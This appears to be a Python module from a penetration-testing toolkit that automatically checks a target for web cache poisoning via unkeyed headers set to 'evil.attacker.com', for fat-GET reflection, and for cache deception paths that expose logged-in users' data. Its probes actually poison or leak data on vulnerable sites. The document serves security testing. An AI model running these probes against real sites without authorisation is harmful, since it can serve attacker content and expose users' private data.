"""bingo/tools/cache_poison.py — 웹 캐시 포이즈닝/디셉션 자동 탐지 (v2.6.0)"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable

# ── 언키드 헤더 후보 ──────────────────────────────────────────────────────────
UNKEYED_HEADERS = [
    "X-Forwarded-Host",
    "X-Forwarded-Scheme",
    "X-Forwarded-Proto",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Forwarded-Port",
    "X-Original-Host",
    "X-Amz-Cf-Id",
    "CF-Connecting-IP",
    "True-Client-IP",
]

POISON_DOMAIN = "evil.attacker.com"

# ── 캐시 디셉션 경로 ──────────────────────────────────────────────────────────
DECEPTION_PATHS = [
    "/account/profile.css",
    "/account/info.jpg",
    "/account/data.js",
    "/dashboard/user.png",
    "/api/user.json.css",
    "/profile/me.ico",
]


@dataclass
class CacheFinding:
    technique: str      # "poisoning" | "deception" | "cpd_dos" | "fat_get"
    url: str
    header_injected: str
    evidence: str
    reflected: bool
    cached: bool
    severity: str
    confirmed: bool
    notes: str = ""


@dataclass
class CacheReport:
    target: str
    findings: list[CacheFinding] = field(default_factory=list)

    @property
    def exploitable(self) -> list[CacheFinding]:
        return [f for f in self.findings if f.confirmed]


class CachePoisonTester:
    """웹 캐시 포이즈닝 + 캐시 디셉션 자동 탐지"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        base_url: str,
        headers: dict | None = None,
    ) -> None:
        self.req = request_fn
        self.base = base_url.rstrip("/")
        self.headers = headers or {}

    def _check_cache_headers(self, resp_headers_str: str) -> bool:
        """응답에 캐시 헤더(X-Cache: HIT 등) 포함 여부"""
        cache_indicators = ["x-cache: hit", "cf-cache-status: hit", "age:", "via:", "x-varnish"]
        return any(ind in resp_headers_str.lower() for ind in cache_indicators)

    # ── 헤더 포이즈닝 탐지 ───────────────────────────────────────────────────
    def test_header_poisoning(self, url: str) -> list[CacheFinding]:
        findings = []
        for header in UNKEYED_HEADERS:
            poison_hdrs = {**self.headers, header: POISON_DOMAIN}
            try:
                status, resp = self.req(url, "GET", poison_hdrs, "")
                # 포이즌 도메인이 응답에 반사되는지 확인
                reflected = POISON_DOMAIN in resp
                cached = self._check_cache_headers(resp)

                if reflected:
                    # 두 번째 요청 (일반 헤더) — 캐시된 응답인지 확인
                    _, resp2 = self.req(url, "GET", self.headers, "")
                    cached_delivery = POISON_DOMAIN in resp2

                    findings.append(CacheFinding(
                        technique="poisoning",
                        url=url,
                        header_injected=f"{header}: {POISON_DOMAIN}",
                        evidence=_extract_reflection(resp, POISON_DOMAIN),
                        reflected=reflected,
                        cached=cached_delivery,
                        severity="CRITICAL" if cached_delivery else "HIGH",
                        confirmed=cached_delivery,
                        notes=f"Domain reflected in response{'  캐시됨!' if cached_delivery else ' (not cached yet)'}",
                    ))
            except Exception:
                pass
        return findings

    # ── Fat GET 포이즈닝 ──────────────────────────────────────────────────────
    def test_fat_get(self, url: str) -> CacheFinding | None:
        """GET에 바디 포함 → 일부 캐시 서버가 무시"""
        fat_body = "x=1&admin=true&debug=true"
        try:
            hdrs = {**self.headers, "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(len(fat_body))}
            status, resp = self.req(url, "GET", hdrs, fat_body)
            if "admin" in resp.lower() or "debug" in resp.lower():
                return CacheFinding(
                    technique="fat_get",
                    url=url,
                    header_injected="GET body: admin=true&debug=true",
                    evidence=resp[:200],
                    reflected=True, cached=False,
                    severity="HIGH", confirmed=True,
                    notes="Fat GET body reflected — cache key may not include body",
                )
        except Exception:
            pass
        return None

    # ── 캐시 디셉션 ───────────────────────────────────────────────────────────
    def test_cache_deception(self, authenticated_url: str) -> list[CacheFinding]:
        """정적 파일 경로를 붙여 인증된 응답을 캐시"""
        findings = []
        for suffix in DECEPTION_PATHS:
            parsed = urllib.parse.urlparse(authenticated_url)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}{suffix}"
            try:
                status, resp = self.req(test_url, "GET", self.headers, "")
                # 민감 데이터가 응답에 있는지
                sensitive = any(kw in resp.lower() for kw in [
                    "email", "username", "password", "token", "credit", "phone",
                    "이메일", "아이디", "비밀번호",
                ])
                if status == 200 and sensitive:
                    _, resp2 = self.req(test_url, "GET", {}, "")  # 비인증 요청
                    delivered = any(kw in resp2.lower() for kw in ["email", "username", "이메일"])
                    findings.append(CacheFinding(
                        technique="deception",
                        url=test_url,
                        header_injected=f"path suffix: {suffix}",
                        evidence=resp[:200],
                        reflected=True,
                        cached=delivered,
                        severity="CRITICAL" if delivered else "HIGH",
                        confirmed=delivered,
                        notes=f"Sensitive data cached via {suffix}",
                    ))
            except Exception:
                pass
        return findings

    def full_scan(self, url: str | None = None) -> CacheReport:
        target = url or self.base
        report = CacheReport(target=target)
        report.findings.extend(self.test_header_poisoning(target))
        fat = self.test_fat_get(target)
        if fat:
            report.findings.append(fat)
        report.findings.extend(self.test_cache_deception(target))
        return report


def _extract_reflection(resp: str, marker: str, context: int = 100) -> str:
    idx = resp.find(marker)
    if idx == -1:
        return ""
    return resp[max(0, idx - 30): idx + context]
